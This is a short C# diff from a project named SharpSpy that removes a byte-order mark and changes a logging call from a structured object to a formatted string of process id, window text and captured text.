@@ -1,4 +1,4 @@
-﻿using System.Text;
+using System.Text;
 using System.Threading;
 
 namespace SharpSpy
@@ -38,12 +38,7 @@ namespace SharpSpy
 
             var text = GetText();
 
-            logger.Log(LOG_SOURCE, new
-            {
-                pid = processId,
-                windowText = windowText,
-                text = text
-            });
+            logger.Log(LOG_SOURCE, $"{processId}/\"{windowText}\": {text}");
         }
     }
 }
